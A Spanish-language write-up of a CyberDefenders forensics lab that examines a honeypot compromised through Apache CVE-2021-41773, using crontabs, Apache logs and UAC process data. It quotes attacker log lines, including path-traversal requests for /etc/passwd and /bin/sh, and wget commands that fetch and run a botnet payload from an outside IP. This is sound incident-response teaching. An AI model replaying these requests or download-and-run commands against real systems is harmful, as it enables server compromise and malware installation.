---
layout: single
title: Cyberdefenders - AzurePot
excerpt: Análisis del comportamiento de unos atacantes en un honeypot en el que se podía explotar el CVE-2021-41773.
date: 2025-5-11
classes: wide
header:
   teaser_home_page: true
   icon: ../assets/images/logo-icon.svg
categories:
   - cyberdefenders
tags:
   - volatility
   - chainsaw
   - apache 
---

En este laboratorio estaremos analizando las técnicas de ataque relacionadas con el CVE-2021-41773, los ficheros que se nos entrega en este laboratorio son de un honeypot en el que se puede explotar esta vulnerabilidad, se nos entrega lo siguiente: 
  
```bash 
┌──(kali㉿kali)-[~/blue-labs/azurepot/temp_extract_dir]
└─$ ls
sdb.vhd-002.gz  uac.tgz  ubuntu.20211208.mem.gz
```
- sdb.vhd.gz es un disco duro virtual, que podemos montar en nuestro SO para analizar los ficheros que conetiene ese sistema. 
- ubuntu.20211208.mem es un volcado de memoria que nos permite analizar procesos volátiles, conexiones de red y actividad de usuario. 
- uac.tgz es un archivo comprimido que contiene los resultados del Unix Artifact Collector (UAC). UAC es una herramienta utilizada para realizar recolección forense en sistemas Unix/Linux. Puede contener procesos en ejecución (ps, top, etc.), archivos abiertos (lsof), conexiones de red activas (netstat, ss), actividad del usuario (historiales, sesiones activas, comandos ejecutados), tareas programadas (cron jobs), información de inicio de sesión, logs del sistema, variables de entorno, información del kernel y del sistema operativo. 

Primeramente vamos usar el fichero .vhd, vamos a usar FTK imager para montar el disco virtual en nuestro windows. asegurándonos de tenerlo en modo solo lectura para no alterar la evidencia. 

![](../assets/images/cyber-azupot/imagen1.png)


<h3 style="color: white;">Fichero : sdb.vhd</h3>


---
<h3 style="color: #0d6efd;">Q1. Hay un script que se ejecuta cada minuto para hacer limpieza. ¿Cuál es el nombre del archivo?</h3>

Una vez montado el .vhd, podemos explorar el sistema de ficheros. Las tareas programadas(que eso son los crontabs) se suelen guardar en la siguiente ruta: 

```bash 
/var/spool/cron/crontabs
```

Navegamos a este directorio y analizamos el unico fichero que nos encontramos.

![](../assets/images/cyber-azupot/imagen2.png)

Donde: 

```bash 
┌───────────── minuto (0 - 59)
│ ┌───────────── hora (0 - 23)
│ │ ┌───────────── día del mes (1 - 31)
│ │ │ ┌───────────── mes (1 - 12)
│ │ │ │ ┌───────────── día de la semana (0 - 7) (0 o 7 = domingo)
│ │ │ │ │
* * * * * comando
```

Otros ejemplos: 

Un `cron` que se ejecute **cada hora**, justo al **minuto 0**:

```
0 * * * * comando
```
* `0` → en el minuto 0
* `*` → cualquier hora
* `*` → cualquier día del mes
* `*` → cualquier mes
* `*` → cualquier día de la semana

**Cada 4 horas:**

```bash
0 */4 * * * comando
```
* `0` → al minuto 0
* `*/4` → cada 4 horas (es decir: 0, 4, 8, 12, 16, 20)
* `* * *` → cualquier día, mes y día de la semana
> Este se ejecutará a las 00:00, 04:00, 08:00, 12:00, 16:00 y 20:00.

**Cada 3 días**

```bash
0 0 */3 * * comando
```
* `0 0` → a la medianoche (00:00)
* `*/3` en el campo del día del mes → cada 3 días (día 3, 6, 9, 12, ... 30)
* `* *` → cualquier mes y cualquier día de la semana
> Nota importante:** Esto **no cuenta 3 días desde la última ejecución**, sino que se ejecuta los días del mes divisibles por 3. Es decir, puede haber meses con desfases si quieres una ejecución estricta "cada 72 horas".

---
<h3 style="color: #0d6efd;">Q2. El script en Q1 termina procesos asociados con dos archivos de malware Bitcoin miner. Cuál es el nombre del primer archivo malicioso?</h3>

Bien, pues revisemos el el crontab, ahí mismo se nos muestra la ruta de donde está. 

![](../assets/images/cyber-azupot/imagen3.png)

Esto: 
- Mata procesos maliciosos (kinsing, kdevtmpfsi), típicos de malware o criptojacking.
- Restringe los archivos usados por el malware (en /tmp) para evitar que vuelvan a ejecutarse o se modifiquen fácilmente.
- Esto es típico de scripts de limpieza o contención después de una infección.

---
<h3 style="color: #0d6efd;">Q3. El script cambia los permisos de algunos archivos. ¿Cuál es su nuevo permiso? </h3>

Esto lo podemos ver en la imagen de la pregunta anterior, recordando que:

| Categoría     | Significado    |
| ------------- | -------------- |
| Primer dígito | Dueño (owner)  |
| Segundo       | Grupo (group)  |
| Tercero       | Otros (others) |

| Permiso   | Valor | Letra | Significado      |
| --------- | ----- | ----- | ---------------- |
| Lectura   | 4     | `r`   | Ver el contenido |
| Escritura | 2     | `w`   | Modificar        |
| Ejecución | 1     | `x`   | Ejecutar         |

Por lo que solo se le asignan permisos de lectura, ni escritura ni ejecución. 

---
<h3 style="color: #0d6efd;">Q4. ¿Cuál es el SHA256 del archivo del agente de la botnet?</h3>

Bien, pues ya sabemos que estamos trabajando con un  CVE-2021-41773, que afecta a las versiones 2.4.49 y 2.4.50 de Apache HTTP Server, permitiendo ataques de path traversal y ejecución remota de código (RCE).

Así que vamos a revisar los los de apache que se encuentran en la siguiente ruta: 
```bash 
/var/log/apache2/access_log
```

Conociendo esta vulnerabilidad podemos fijarnos en intentos de recorrer rutas dentro del servidor, nos fijamos en peticiones `GET` `POST` que en su ruta tengan el `Urlenconde` `%2E` que representa el punto, que se usa para intentar recorrer de forma recursiva directorios: `../../..`

Aplicamos sobre los logs un grepeado bastante específico: 

```bash 
┌──(kali㉿kali)-[~/blue-labs/azurepot/temp_extract_dir/artefactos]
└─$ grep -E "GET|POST" access_log | grep '" 200 ' | grep -E "bin\/sh|passwd"

185.247.225.61 - - [06/Oct/2021:23:04:43 +0000] "GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e//etc/passwd HTTP/1.1" 200 1567 "-" "curl/7.64.0"
176.10.99.200 - - [06/Oct/2021:23:05:35 +0000] "GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e//etc/passwd HTTP/1.1" 200 1567 "-" "curl/7.64.0"
176.10.99.200 - - [06/Oct/2021:23:06:05 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e//bin/sh HTTP/1.1" 200 121432 "-" "curl/7.64.0"
176.10.99.200 - - [06/Oct/2021:23:06:10 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e//bin/sh HTTP/1.1" 200 121432 "-" "curl/7.64.0"
176.10.99.200 - - [06/Oct/2021:23:12:35 +0000] "GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e//etc/passwd HTTP/1.1" 200 1567 "-" "curl/7.64.0"
176.10.99.200 - - [06/Oct/2021:23:13:22 +0000] "GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e//etc/passwd HTTP/1.1" 200 1567 "-" "curl/7.64.0"
193.32.127.156 - - [06/Oct/2021:23:26:47 +0000] "GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e//etc/passwd HTTP/1.1" 200 1567 "-" "curl/7.64.0"
193.32.127.156 - - [06/Oct/2021:23:27:51 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e//bin/sh HTTP/1.1" 200 45 "-" "curl/7.64.0"
193.32.127.156 - - [06/Oct/2021:23:28:02 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e//bin/sh HTTP/1.1" 200 45 "-" "curl/7.64.0"
193.32.127.156 - - [06/Oct/2021:23:30:45 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e//bin/sh HTTP/1.1" 200 45 "-" "curl/7.64.0"
193.32.127.156 - - [06/Oct/2021:23:32:42 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e//bin/sh HTTP/1.1" 200 45 "-" "curl/7.64.0"
5.183.209.217 - - [06/Oct/2021:23:36:55 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e//bin/sh HTTP/1.1" 200 45 "-" "curl/7.64.0"
5.183.209.217 - - [06/Oct/2021:23:39:17 +0000] "GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e//etc/passwd HTTP/1.1" 200 1567 "-" "curl/7.64.0"
5.183.209.217 - - [06/Oct/2021:23:39:41 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e//bin/sh HTTP/1.1" 200 121432 "-" "curl/7.64.0"
5.183.209.217 - - [06/Oct/2021:23:40:02 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e//bin/sh HTTP/1.1" 200 45 "-" "curl/7.64.0"
18.27.197.252 - - [06/Oct/2021:23:45:36 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e//bin/sh HTTP/1.1" 200 45 "-" "curl/7.64.0"
``` 

Vemos varias respuestas con código 200, el atacante logró acceder al servidor. Ahora tenemos que deterinar si intentó instalar algo en sus tareas de post-explotación. Para hacerlo fácil podemos ir a los logs de error que estan en el mismo directori que el fichero de access_log. 
Primeramente vemos bastantes error relacionados al recorrido de directorios, asi que filtremos por comandos típicos que usan los atacantes, en este caso, dar permisos de ejecición a un fichero. 
```bash
Lenovo@DESKTOP-8IOU1HC MINGW64 /e/[root]/var/log/apache2
$ grep "chmod +x" error_log
[Thu Nov 11 19:07:41.956674 2021] [dumpio:trace7] [pid 804:tid 139978797401856] mod_dumpio.c(103): [client 141.135.85.36:51774] mod_dumpio:  dumpio_in (data-HEAP): echo; wget -O dk86 http://138.197.206.223:80/wp-content/themes/twentysixteen/dk86; chmod +x dk86; ./dk86 &;
[Thu Nov 11 19:07:41.962142 2021] [cgi:error] [pid 804:tid 139978797401856] [client 141.135.85.36:51774] AH01215: /bin/bash: line 1: `echo; wget -O dk86 http://138.197.206.223:80/wp-content/themes/twentysixteen/dk86; chmod +x dk86; ./dk86 &;': /bin/bash
[Thu Nov 11 19:07:55.978392 2021] [dumpio:trace7] [pid 803:tid 139978789009152] mod_dumpio.c(103): [client 141.135.85.36:51800] mod_dumpio:  dumpio_in (data-HEAP): echo; /usr/bin/wget -O dk86 http://138.197.206.223:80/wp-content/themes/twentysixteen/dk86; chmod +x dk86; ./dk86 &;
[Thu Nov 11 19:07:55.984379 2021] [cgi:error] [pid 803:tid 139978789009152] [client 141.135.85.36:51800] AH01215: /bin/bash: line 1: `echo; /usr/bin/wget -O dk86 http://138.197.206.223:80/wp-content/themes/twentysixteen/dk86; chmod +x dk86; ./dk86 &;': /bin/bash
[Thu Nov 11 19:08:22.859342 2021] [dumpio:trace7] [pid 803:tid 139978898114304] mod_dumpio.c(103): [client 141.135.85.36:51858] mod_dumpio:  dumpio_in (data-HEAP): echo; /usr/bin/wget -O /tmp/dk86 http://138.197.206.223:80/wp-content/themes/twentysixteen/dk86; chmod +x  /tmp/dk86; /tmp/dk86 &;
[Thu Nov 11 19:08:22.865585 2021] [cgi:error] [pid 803:tid 139978898114304] [client 141.135.85.36:51858] AH01215: /bin/bash: line 1: `echo; /usr/bin/wget -O /tmp/dk86 http://138.197.206.223:80/wp-content/themes/twentysixteen/dk86; chmod +x  /tmp/dk86; /tmp/dk86 &;': /bin/bash
[Thu Nov 11 19:09:46.456875 2021] [dumpio:trace7] [pid 804:tid 139978822579968] mod_dumpio.c(103): [client 141.135.85.36:52014] mod_dumpio:  dumpio_in (data-HEAP): echo; chmod +x /tmp/dk86;

```

Varios intentos de dar permisos de ejecución a un fichero que está en `/tmp`, ruta común para alojar malware debido a que casi no hay restriccciones en este directorio. 
Viajamos a la ruta y vemos que efectiavamente está aquí: 
```bash
Lenovo@DESKTOP-8IOU1HC MINGW64 /e/[root]/var/tmp
$ ls
cloud-init/  dk86  systemd-private-9c935011ab6e49a49dffdb40eb9ced7c-systemd-resolved.service-9NWult/  systemd-private-9c935011ab6e49a49dffdb40eb9ced7c-systemd-timesyncd.service-pInZB2/
```

Obtenemos el hash: 
```bash
Lenovo@DESKTOP-8IOU1HC MINGW64 /e/[root]/var/log/apache2
$ sha256sum dk86
0e574fd30e806fe4298b3cbccb8d1089454f42f52892f87554325cb352646049 *dk86
```

---
<h3 style="color: #0d6efd;">Q5. ¿Cuál es el nombre de la red de bots en la Q4?</h3>

Para esto podemos simplemente subir el hasha a virus total, vemos que mencionan mucho a un backdoor en linux llamado `Tsunami`. 

![](../assets/images/cyber-azupot/imagen4.png)

---
<h3 style="color: #0d6efd;">Q5. ¿Qué dirección IP coincide con la marca de tiempo de creación del archivo del agente de la botnet en Q4?</h3>

Esto lo podemos ver en el fichero de error_log 

---
<h3 style="color: #0d6efd;"> </h3>


Tmmbién lo podemos ver en la pregunta 4, se hace un `wget`  a la siguiente dirección: 

```bash
http://138.197.206.223:80/wp-content/themes/twentysixteen/dk86
```

---
<h3 style="color: #0d6efd;">Q8. ¿Cuál es el nombre del archivo que el atacante descargó para ejecutar el script malicioso y posteriormente eliminarse?</h3>

Para resolver esto podemos ir pensando en los comandos que los atacantes suele untilizar para descargar recurso de internet, tales como wget o curl, se me ocurrió crear una lista de estos comandos y los parámetros más comunes para estas actividades: 

Aquí tienes una lista de comandos y parámetros que suelen ser muy útiles en un análisis de trazas de descarga y ejecución maliciosa, y que puedes mencionar en tu reporte:

* **`curl`**

  * `-O` guarda con nombre original.
  * `-o archivo` guarda con nombre personalizado.
  * `-L` sigue redirecciones.
  * `-I` sólo headers.
  * `-sS` silencioso pero muestra errores.
  * `--data-urlencode` para enviar datos codificados.

* **`wget`**

  * `-O archivo` fuerza nombre de salida.
  * `-q` silencioso.
  * `-c` reanuda descargas.
  * `--no-check-certificate` omite validación TLS.
  * `--method=POST` y `--body-data=` para peticiones HTTP avanzadas.

* **PowerShell / Windows**

  * `Invoke-WebRequest -Uri URL -OutFile archivo`
  * `Start-BitsTransfer -Source URL -Destination archivo` (uso de BITS).

También es común que los atacantes ofusquen código o entrucciones en base64o urlencode, con esto en mente podemos ver lo siguiente:

Así que finalmente podemos ver lo que parece ser código ofuscado con el siguiente comando: 

![](../assets/images/cyber-azupot/imagen5.png)

Si tratamos de desencodearlo veremos que parece estar incompleto, ya que el mod\_dumpio en Apache registra los datos en crudo, cada vez que lee del socket o procesa un fragmento del cuerpo de la petición lo vuelca al log por separado, en bloques de tamaño fijo (o bien en función de cuándo recibe un `\r\n`). Por eso ves varias entradas consecutivas:

1. **Mod\_dumpio traza lecturas parciales**

   * Cada llamada interna a `ap_getline()` o `ap_rgetline()` (líneas marcadas con `(getline-blocking)`) vuelca el trozo de datos hasta el siguiente salto de línea o hasta el tamaño de buffer.
   * Cada llamada a la rutina que maneja el heap (marcada con `(data-HEAP)`) vuelca el siguiente bloque de bytes crudos.

2. **Tamaños de bloque y delimitadores**

   * De forma predeterminada mod\_dumpio volcará hasta un máximo de unos cuantos kilobytes por operación de lectura. Si tu base64 ocupa más, lo verás fragmentado.
   * Además, si la petición lleva `\r\n` (como parte del protocolo HTTP, o si el payload se envía en varias líneas), mod\_dumpio lo respetará y hará un nuevo dump cuando encuentre ese salto de línea.

Así que podemos obtener más datos con el siguiente comando: 
```bash
$ grep -B 5 -A 5 "\-\-data\-urlencode" error_log
```

Obtendremos varios fragmentos, en uno de ellos encontraremos lo siguiente: 
```bash 
 -o .install; chmod +x .install; sh .install > /dev/null 2>&1 & echo 'Done'; else echo 'Already install. Started'; cd .log/101068/.spoollog && sh .cron.sh > /dev/null 2>&1 & fi
```

En otra podemos ver: 
```bash 
rm -rf .install
```

Parece que esta es nuestra flag. 
---
<h3 style="color: #0d6efd;">Q9. El atacante descargó scripts SH. ¿Cómo se llaman estos archivos?</h3>

Para esto podemos filtrar unicamente para scripts .sh: 

```bash
┌──(kali㉿kali)-[~/blue-labs/azurepot]
└─$ grep -E "curl|wget" error_log |grep -oE '\b[a-zA-Z0-9._/-]+\.sh\b' | sort | uniq
0_cron.sh
0_linux.sh
103.55.36.245/0_cron.sh
103.55.36.245/0_linux.sh
194.147.142.108/a/wget.sh
195.19.192.28/ap.sh
212.193.30.245/bins.sh
2.56.59.64/bins.sh
45.137.155.55/ap.sh
86.105.195.120/cleanfda/init.sh
88.218.227.141/wget.sh
download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh
src.sh
tmp/bins.sh
tmpfiles.org/dl/168017/wk.sh
wget.sh
```

Vemos varios, posiblemente igual de maliciosos que aquellos que nos piden.

<h3 style="color: white;">Fichero: UAC</h3>

---
<h3 style="color: #0d6efd;">Q10. Dos procesos sospechosos se estaban ejecutando desde un directorio eliminado. ¿Cuáles son sus PID?</h3>

Bien, podemos aplicar elsiguiente comando en la ruta mostrada: 
```bash
┌──(kali㉿kali)-[~/…/temp_extract_dir/uac/live_response/process]
└─$ grep "deleted" *
ls_-la_proc.txt:lrwxrwxrwx   1 daemon daemon 0 Dec  8 18:51 cwd -> /var/tmp/.log/101068/.spoollog (deleted)
ls_-la_proc.txt:lrwxrwxrwx   1 daemon daemon 0 Dec  8 18:51 exe -> /tmp/agettyd (deleted)
ls_-la_proc.txt:lrwxrwxrwx   1 root root 0 Dec  8 18:51 exe -> / (deleted)
ls_-la_proc.txt:lrwxrwxrwx   1 daemon daemon 0 Dec  8 18:51 cwd -> /var/tmp/.log/101068/.spoollog (deleted)
lsof_-nPl.txt:none        609              0  txt       REG                0,1     8632      15254 / (deleted)
lsof_-nPl.txt:sleep      6388              1  cwd       DIR               8,17        0     528743 /var/tmp/.log/101068/.spoollog (deleted)
lsof_-nPl.txt:sh        20645              1  cwd       DIR               8,17        0     528743 /var/tmp/.log/101068/.spoollog (deleted)
lsof_-nPl.txt:sh        20645              1   10r      REG               8,17     9087     528810 /var/tmp/.log/101068/.spoollog/.src.sh (deleted)
lsof_-nPl.txt:agettyd   24330              1  txt       REG               8,17  7244192      30248 /tmp/agettyd (deleted)
lsof_-nPl.txt:agettyd   24330  7897        1  txt       REG               8,17  7244192      30248 /tmp/agettyd (deleted)
lsof_-nPl.txt:agettyd   24330 24333        1  txt       REG               8,17  7244192      30248 /tmp/agettyd (deleted)
lsof_-nPl.txt:agettyd   24330 24334        1  txt       REG               8,17  7244192      30248 /tmp/agettyd (deleted)
lsof_-nPl.txt:agettyd   24330 24335        1  txt       REG               8,17  7244192      30248 /tmp/agettyd (deleted)
lsof_-nPl.txt:agettyd   24330 24336        1  txt       REG               8,17  7244192      30248 /tmp/agettyd (deleted)
lsof_-nPl.txt:agettyd   24330 24337        1  txt       REG               8,17  7244192      30248 /tmp/agettyd (deleted)
grep: proc: Is a directory
running_processes_full_paths.txt:lrwxrwxrwx 1 daemon           daemon           0 Dec  8 18:51 /proc/24330/exe -> /tmp/agettyd (deleted)
running_processes_full_paths.txt:lrwxrwxrwx 1 root             root             0 Dec  8 18:51 /proc/609/exe -> / deleted)
```

Vemos varios procesos, pero los que nos interesan son aquellos que están corriendo desde la ruta `/vat/tmp`

Diferenciando ambas rutas: 

## 1. `/tmp`
* **Propósito**: almacenamiento de archivos temporales de programas y usuarios durante la sesión activa.
* **Limpieza automática**: muchos sistemas (o administradores) configuran `/tmp` para que se vacíe en cada reinicio del sistema, o que borre ficheros que lleven sin usarse “demasiado” tiempo (por ejemplo, tras 10 o 30 días).
* **Permisos**: todos los usuarios pueden escribir ahí (`drwxrwxrwt`), lo que lo hace cómodo pero también un blanco común para malware que quiera ejecutar binarios sin dejar rastro en lugares “más protegidos”.
* **Uso típico**: caches, sockets de comunicación interprocesos, ficheros de intercambio “rápido”, instalaciones de paquetes en curso…

## 2. `/var/tmp`
* **Propósito**: almacenamiento de archivos que deben sobrevivir a un reinicio del sistema.
* **Limpieza más laxa**: por la jerarquía FHS (Filesystem Hierarchy Standard), los datos en `/var/tmp` pueden mantenerse a través de reinicios; normalmente sólo se borran tras un periodo prolongado (por ejemplo, 30 o 60 días sin uso) o manualmente.
* **Permisos**: también es un “world-writable” con sticky bit (`drwxrwxrwt`), de modo similar a `/tmp`.
* **Uso típico**: ficheros temporales de aplicaciones que tardan mucho en generarlos (respaldos intermedios, compresión de grandes volúmenes, descargas parciales que deben persistir…)

---
<h3 style="color: #0d6efd;">Q11. ¿Cuál es la línea de comando sospechosa asociada con el PID que termina con `45` en Q10?</h3>


Podemos aplicar el siguiente comando para buscar procesos con este PID: 
```bash
┌──(kali㉿kali)-[~/…/temp_extract_dir/uac/live_response/process]
└─$ grep "20645" *
hash_running_processes.md5:453dc13f62c115c7b28cb4ede0ea3107  /proc/20645/exe
hash_running_processes.sha1:74a1dc2024957db6a9074401954b57dad2cf2aac  /proc/20645/exe
ls_-la_proc.txt:/proc/20645:
lsof_-nPl.txt:sh        20645              1  cwd       DIR               8,17        0     528743 /var/tmp/.log/101068/.spoollog (deleted)
lsof_-nPl.txt:sh        20645              1  rtd       DIR               8,17     4096          2 /
lsof_-nPl.txt:sh        20645              1  txt       REG               8,17   121432         27 /bin/dash
lsof_-nPl.txt:sh        20645              1  mem       REG               8,17  2030928       2189 /lib/x86_64-linux-gnu/libc-2.27.so
lsof_-nPl.txt:sh        20645              1  mem       REG               8,17   179152       2164 /lib/x86_64-linux-gnu/ld-2.27.so
lsof_-nPl.txt:sh        20645              1    0r      CHR                1,3      0t0          6 /dev/null
lsof_-nPl.txt:sh        20645              1    1w      CHR                1,3      0t0          6 /dev/null
lsof_-nPl.txt:sh        20645              1    2w      CHR                1,3      0t0          6 /dev/null
lsof_-nPl.txt:sh        20645              1   10r      REG               8,17     9087     528810 /var/tmp/.log/101068/.spoollog/.src.sh (deleted)
grep: proc: Is a directory
ps_auxwwwf.txt:daemon   20645  0.5  0.0   4632   756 ?        S    Nov14 181:59 sh .src.sh
ps_auxwww.txt:daemon   20645  0.5  0.0   4632   756 ?        S    Nov14 181:59 sh .src.sh
ps_-deaf.txt:daemon    6388 20645  0 18:50 ?        00:00:00 sleep 300
ps_-deaf.txt:daemon   20645     1  0 Nov14 ?        03:01:59 sh .src.sh
ps_-efl.txt:0 S daemon    6388 20645  0  80   0 -  1134 hrtime 18:50 ?        00:00:00 sleep 300
ps_-efl.txt:0 S daemon   20645     1  0  80   0 -  1158 wait   Nov14 ?        03:01:59 sh .src.sh
ps_-ef.txt:daemon    6388 20645  0 18:50 ?        00:00:00 sleep 300
ps_-ef.txt:daemon   20645     1  0 Nov14 ?        03:01:59 sh .src.sh
ps_-eo_pid_user_etime_args.txt:20645 daemon   24-17:25:07 sh .src.sh
ps_-eo_pid_user_lstart_args.txt:20645 daemon   Sun Nov 14 01:26:25 2021 sh .src.sh
running_processes_full_paths.txt:lrwxrwxrwx 1 daemon           daemon           0 Dec  8 18:51 /proc/20645/exe -> /bin/dash
top_-b_-n1.txt:20645 daemon    20   0    4632    756    580 S  0.0  0.1 181:59.84 sh
```

Esto ya lo podemos ver en la sigiente linea: `lsof_-nPl.txt:sh        20645              1  cwd       DIR               8,17        0     528743 /var/tmp/.log/101068/.spoollog (deleted)`

El "sh" en "lsof_-nPl.txt:sh" indica que se ejecutó con un interpréte de shell, podremos ver otros valores como bash, python, nc o sleep para dormir un programa malicioso. 

Lo podemos confirmar en:`ps_-eo_pid_user_lstart_args.txt:20645 daemon   Sun Nov 14 01:26:25 2021 sh .src.sh` 

---
<h3 style="color: #0d6efd;">Q12. UAC reunió algunos datos del segundo proceso en Q10. Cuál es la dirección IP remota y el puerto remoto que se utilizó en el ataque? </h3>

Para esto podemosirnos al directorio `proc`

El directorio `proc` dentro de `/azurepot/temp_extract_dir/uac/live_response/process/` contiene los **procesos activos capturados por UAC** durante la respuesta en vivo.

* Cada subdirectorio (por ejemplo, `20645`, `101`, etc.) representa un proceso identificado por su **PID** (Process ID).
* Dentro de cada carpeta de PID, se guardan detalles del proceso, como:
  * `environ.txt`: variables de entorno del proceso.
  * `cmdline.txt`: los argumentos con los que se ejecutó.
  * `cwd.txt`: el directorio de trabajo actual del proceso.
  * `exe.txt`: ruta al ejecutable del proceso.
  * Otros archivos con información relevante para análisis forense.

Aspi que vamos al directorio 20645 dentro de proc y si leemos el fichero `environ.txt` podremos encontrar la ip y el puerto. 

---
<h3 style="color: #0d6efd;">Q12. ¿Qué usuario fue responsable de ejecutar el comando en P11? </h3>

Esto lo podemos ver en la salida del comando de la pregunta 11. 

`ps_-eo_pid_user_lstart_args.txt:20645 daemon   Sun Nov 14 01:26:25 2021 sh .src.sh`

El usuario daemon es una cuenta de sistema estándar, con pocos privilegios, que se utiliza para ejecutar servicios y procesos en segundo plano que no requieren privilegios elevados. Mientras que los procesos legítimos del sistema a menudo se ejecutan bajo esta cuenta, los atacantes pueden aprovecharla para ejecutar comandos maliciosos con privilegios mínimos, reduciendo el riesgo de detección y manteniendo al mismo tiempo el acceso al sistema.

---
<h3 style="color: #0d6efd;">Q13. Dos procesos shell sospechosos se estaban ejecutando desde la carpeta tmp. ¿Cuáles son sus PID? </h3>

Para esto seguimos trabajando en el directorio de /process, aplicamos un filtro por el directorio "/tmp":

```bash
┌──(kali㉿kali)-[~/…/temp_extract_dir/uac/live_response/process]
└─$ grep "/tmp" *
ls_-la_proc.txt:lrwxrwxrwx   1 daemon daemon 0 Dec  8 18:51 cwd -> /tmp
ls_-la_proc.txt:lrwxrwxrwx   1 daemon daemon 0 Dec  8 18:51 cwd -> /var/tmp/.log/101068/.spoollog (deleted)
ls_-la_proc.txt:lrwxrwxrwx   1 daemon daemon 0 Dec  8 18:51 cwd -> /tmp
ls_-la_proc.txt:lrwxrwxrwx   1 daemon daemon 0 Dec  8 18:51 exe -> /tmp/agettyd (deleted)
ls_-la_proc.txt:lrwxrwxrwx   1 daemon daemon 0 Dec  8 18:51 cwd -> /var/tmp/.log/101068/.spoollog (deleted)
ls_-la_proc.txt:lrwxrwxrwx   1 daemon daemon 0 Dec  8 18:52 cwd -> /tmp
ls_-la_proc.txt:lrwxrwxrwx   1 daemon daemon 0 Dec  8 18:52 cwd -> /tmp
lsof_-nPl.txt:sleep      6388              1  cwd       DIR               8,17        0     528743 /var/tmp/.log/101068/.spoollog (deleted)
lsof_-nPl.txt:sh        15853              1  cwd       DIR               8,17    12288       4059 /tmp
lsof_-nPl.txt:sh        20645              1  cwd       DIR               8,17        0     528743 /var/tmp/.log/101068/.spoollog (deleted)
lsof_-nPl.txt:sh        20645              1   10r      REG               8,17     9087     528810 /var/tmp/.log/101068/.spoollog/.src.sh (deleted)
lsof_-nPl.txt:sh        21785              1  cwd       DIR               8,17    12288       4059 /tmp
lsof_-nPl.txt:agettyd   24330              1  txt       REG               8,17  7244192      30248 /tmp/agettyd (deleted)
lsof_-nPl.txt:agettyd   24330  7897        1  txt       REG               8,17  7244192      30248 /tmp/agettyd (deleted)
lsof_-nPl.txt:agettyd   24330 24333        1  txt       REG               8,17  7244192      30248 /tmp/agettyd (deleted)
lsof_-nPl.txt:agettyd   24330 24334        1  txt       REG               8,17  7244192      30248 /tmp/agettyd (deleted)
lsof_-nPl.txt:agettyd   24330 24335        1  txt       REG               8,17  7244192      30248 /tmp/agettyd (deleted)
lsof_-nPl.txt:agettyd   24330 24336        1  txt       REG               8,17  7244192      30248 /tmp/agettyd (deleted)
lsof_-nPl.txt:agettyd   24330 24337        1  txt       REG               8,17  7244192      30248 /tmp/agettyd (deleted)
grep: proc: Is a directory
running_processes_full_paths.txt:lrwxrwxrwx 1 daemon           daemon           0 Dec  8 18:51 /proc/24330/exe -> /tmp/agettyd (deleted)
```

Podemos ver dos procesos que corren directamente desde "/tmp", que es bastante sospechoso por sus característidas de poder ser escribibles por todos los usuarios en el sistema. 

<h2 style="color: white;">Fichero: ubuntu.20211208.mem</h2>

<h3 style="color: white;">Fichero: ubuntu.20211208</h3>

---
<h3 style="color: #0d6efd;">Q14. ¿Cuál es la dirección MAC de la memoria capturada?</h3>

Para esto vamos a crear un perfil para nuestro volcado de memoria, vamos a usar las funcionalidades de volatility2 y volatility3. 


Primero obtenemos la version del kernel del volcado de memoria: 
```bash
┌──(venv)─(kali㉿kali)-[~/blue-labs/azurepot/temp_extract_dir/memoria]
